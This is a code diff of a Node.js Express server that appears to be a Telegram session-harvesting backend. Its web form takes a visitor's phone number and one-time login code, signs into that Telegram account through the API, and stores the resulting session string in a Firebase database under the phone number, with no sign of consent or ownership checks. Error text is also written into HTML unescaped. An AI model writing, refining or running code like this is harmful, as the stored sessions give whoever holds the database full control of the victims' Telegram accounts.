@@ -6,11 +6,11 @@ const { StringSession } = require('telegram/sessions');
 const admin = require('firebase-admin');
 
 const app = express();
-app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static('.'));
 
-// Firebase setup
+// ================= FIREBASE =================
 admin.initializeApp({
   credential: admin.credential.cert({
     projectId: process.env.FIREBASE_PROJECT_ID,
@@ -19,84 +19,114 @@ admin.initializeApp({
   }),
   databaseURL: `https://${process.env.FIREBASE_PROJECT_ID}.firebaseio.com`
 });
+
 const db = admin.database();
 
-// Telegram credentials
+// ================= TELEGRAM =================
 const apiId = parseInt(process.env.API_ID);
 const apiHash = process.env.API_HASH;
 
-// Serve index.html
+// temp store
+const tempSessions = {};
+
+// ================= ROUTES =================
+
+// Serve UI
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Temp store phone session in memory
-const tempSessions = {};
 
-// ------------------- SEND OTP -------------------
+// 🔹 STEP 1: SEND OTP
 app.post('/send-otp', async (req, res) => {
   const { phone } = req.body;
-  if (!phone) return res.json({ success: false, error: 'Phone required' });
+
+  if (!phone) {
+    return res.json({ success: false, error: 'Phone required' });
+  }
 
   try {
     const stringSession = new StringSession('');
-    const client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });
-
-    await client.start({
-      phoneNumber: async () => phone,
-      password: async () => '', // optional 2FA, adjust if needed
-      onError: (err) => console.log(err)
+    const client = new TelegramClient(stringSession, apiId, apiHash, {
+      connectionRetries: 5,
     });
 
-    // Send code
-    const result = await client.sendCodeRequest(phone);
+    await client.connect(); // ✅ correct
 
-    // Store temp session object in memory for OTP verification
-    tempSessions[phone] = { client, phone_code_hash: result.phoneCodeHash };
+    const result = await client.sendCode({
+      apiId,
+      apiHash,
+    }, {
+      phoneNumber: phone,
+    });
+
+    // save temp
+    tempSessions[phone] = {
+      client,
+      phoneCodeHash: result.phoneCodeHash,
+    };
+
+    console.log("OTP sent to:", phone);
 
     res.json({ success: true });
+
   } catch (err) {
-    console.error(err);
-    res.json({ success: false, error: err.message });
+    console.error("SEND OTP ERROR:", err.message);
+    res.status(500).json({
+      success: false,
+      error: err.message
+    });
   }
 });
 
-// ------------------- VERIFY OTP & LOGIN -------------------
+
+// 🔹 STEP 2: VERIFY OTP
 app.post('/login', async (req, res) => {
   const { phone, otp } = req.body;
-  if (!phone || !otp) return res.send('Phone & OTP required');
+
+  if (!phone || !otp) {
+    return res.send("Phone & OTP required");
+  }
 
   try {
     const temp = tempSessions[phone];
-    if (!temp) return res.send('No OTP request found for this phone');
 
-    const { client, phone_code_hash } = temp;
+    if (!temp) {
+      return res.send("Session expired. Try again.");
+    }
 
-    // Sign in with OTP
+    const { client, phoneCodeHash } = temp;
+
     await client.signIn({
       phoneNumber: phone,
       phoneCode: otp,
-      phoneCodeHash: phone_code_hash
+      phoneCodeHash: phoneCodeHash,
     });
 
-    // Save session string
     const sessionString = client.session.save();
 
-    // Store session in Firebase
+    // save to Firebase
     await db.ref('telegram_sessions/' + phone).set({
       session: sessionString,
       timestamp: Date.now()
     });
 
-    // Clear temp session
+    // cleanup
     delete tempSessions[phone];
 
-    res.send(`<h3>Login successful! Session saved in Firebase.</h3><p><a href="/">Back</a></p>`);
+    console.log("LOGIN SUCCESS:", phone);
+
+    res.send("<h3>✅ Login successful!</h3>");
+
   } catch (err) {
-    console.error(err);
-    res.send(`<h3>Login failed: ${err.message}</h3><p><a href="/">Back</a></p>`);
+    console.error("LOGIN ERROR:", err.message);
+    res.send(`<h3>❌ ${err.message}</h3>`);
   }
 });
 
+
+// ================= START =================
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, () => {
+  console.log("Server running on port", PORT);
+});
